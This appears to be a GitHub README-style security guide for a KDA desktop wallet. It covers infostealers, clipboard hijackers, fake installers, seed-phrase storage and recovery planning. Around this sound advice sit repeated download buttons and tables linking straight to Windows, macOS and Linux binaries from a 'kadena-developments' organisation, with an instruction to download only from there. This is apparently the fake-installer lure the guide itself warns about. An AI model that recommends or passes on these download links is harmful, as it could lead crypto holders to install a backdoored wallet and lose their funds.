![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Kadena Wallet Security: A Threat Model You Can Act On</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Most wallet advice is a list of prohibitions with no model behind it. This is the model: what a
desktop wallet can protect, what it cannot, and which attacks actually reach a KDA holder in 2026.

Read it once, then act on the four items in the last section. Those four cover the majority of real
losses.

## What a wallet actually protects

A self-custody desktop wallet does one job: it holds a key in encrypted form on your disk and uses
it to sign transactions you approve. Everything else is convenience.

That means the security boundary is the machine, not the app. If someone can read your disk, watch
your screen, or replace the file you installed, the wallet's design is not what decides the outcome.
Kadena's account model adds one wrinkle: a `k:` account is derived from a public key, so anyone who
obtains the corresponding private key obtains the funds directly, with no recovery process and no
central party to appeal to.

There is also no way to rotate a key behind a `k:` account. Compromise is permanent for that address.
That single fact is why the advice below is conservative.

## The threat model, by attack

| Attack | How it reaches you | What it gets | Primary defence |
| --- | --- | --- | --- |
| Infostealer malware | Cracked software, fake updates, pirated installers | Wallet files, browser data, clipboard | Keep secrets off the general-purpose machine |
| Clipboard hijacker | Same malware families | A swapped destination address | Verify the destination on screen, not from the clipboard |
| Fake installer | Search ads, lookalike domains, reposted archives | A backdoored wallet | Get the build from the project's own release page, check the hash |
| Phishing site | DMs, sponsored results, "support" links | Your phrase, typed voluntarily | No legitimate process ever asks for it |
| Malicious dApp or contract | A "claim", "migrate" or "airdrop" page | Approval to move funds | There is no KDA migration; there is nothing to claim |
| Endpoint tampering | A wallet pointed at a hostile node | A wrong balance, a wrong nonce, a stalled transfer | Check the address in a second, independent explorer |
| Shoulder surfing and cameras | Shared space, screen sharing, recordings | The phrase or the password | Never display recovery material on a screen |
| Physical theft of a backup | Paper in a wallet, note in a drawer | Everything | Split location, no labels, no digital copy |

Two rows deserve emphasis because they are the ones people underestimate.

**Clipboard hijackers** are common and cheap. The malware watches for a string that looks like an
address and substitutes its own. On Kadena the `k:` prefix and fixed 66-character length make a
substitution easy to miss at a glance, so the check has to be deliberate: compare the first six and
last six characters on the wallet's own confirmation screen, against the source you trust.

**Endpoint tampering** is specific to a multi-chain network. A wallet asks a node what your balance
is; a hostile or broken node can answer wrongly. This does not let anyone steal funds, but it can
make you send twice, or conclude a transfer failed when it succeeded. The remedy is boring and
effective: confirm in a second explorer that is not the one the wallet uses.

## The four things that matter most

1. **Keep the phrase offline, in two places, on paper or metal.** Not a photo, not a password
   manager, not a cloud note, not a text file named something clever. Two locations, no labels that
   say what they are, and no copy that syncs.
2. **Install only from the project's release page, and verify what you downloaded.** Search results
   and ads are the delivery mechanism of choice for fake wallets. If a build is published with a
   checksum, compare it. If it is not, treat the download as unverified, not as safe.
3. **Treat every destination as hostile until checked.** Copy, then compare on the confirmation
   screen, then send a small test amount the first time you use an address. This is not excessive
   caution; a wrong address on a public chain is a donation.
4. **Do not run a wallet on a machine you use for everything.** A separate OS user, a virtual
   machine, or a cheap dedicated laptop removes most malware exposure at once. This is the single
   highest-value change available to a desktop wallet user.

## Password, phrase, and what each one does

People conflate these constantly, and the confusion is exploitable.

- **The recovery phrase** is the key. It restores the account anywhere, with no password.
- **The wallet password** is local encryption. It slows down someone with your disk. It does not
  protect you from malware running as you, and it is not needed to restore elsewhere.
- **The device PIN**, on hardware, protects the device. It is not a backup.

So a strong password on a wallet whose phrase sits in a screenshot is decoration. Order of
importance is phrase, then machine hygiene, then password.

## Hardware, honestly

A hardware wallet keeps the key off the computer and makes you approve on a separate screen. That
defeats remote malware and clipboard substitution in one move, and it is the right choice for a
balance you do not touch often.

It does not defeat a malicious transaction you approve, a phishing site that convinces you to send,
or a lost backup. Ledger's own Kadena documentation is explicit that accounts are not managed in
Ledger Live and that signing happens through a companion tool over WebHID, so the browser session
and the site you loaded are still part of your attack surface.

## What a wallet cannot protect you from

- A phrase you gave away, typed into a "checker", or stored in a screenshot.
- A transfer you approved to the wrong address.
- A fake build you installed with your own hands.
- A machine already compromised before the wallet was installed.
- Anything that happened at an exchange while your KDA was there, which is custody, not self-custody.

Naming those limits is more useful than promising protection the software cannot deliver.

## A recovery plan you can actually run

Write this down before you need it:

1. Where the two phrase copies are, described without naming them ("envelope A", "box B").
2. Which addresses you hold, on which chains, and on which derivation path they were created.
3. Which wallet you would reinstall, and where its verified release page is.
4. What you would do first if a balance disappeared: check a second explorer, check other chains,
   check the derivation path - in that order.

That last item is the difference between a bad afternoon and a bad month. Most "lost funds" reports
are chain selection, derivation, or indexer problems, not theft.

## Related reading

- Avoid KDA recovery scams
- Importing a Chainweaver seed into Kadena Wallet
- Ledger not showing KDA? What Kadena Wallet users check first
- How to create a KDA account in Kadena Wallet

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [KDA Recovery Scams: How to Spot Them in Kadena Wallet Support](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/avoid-kadena-recovery-scams.md)
- [Running a Kadena Account From a Phone: What Actually Works](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-mobile-app-availability.md)
- [Backing Up Kadena Wallet: A Restore You Have Tested](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/kadena-wallet-backup-and-restore-guide.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
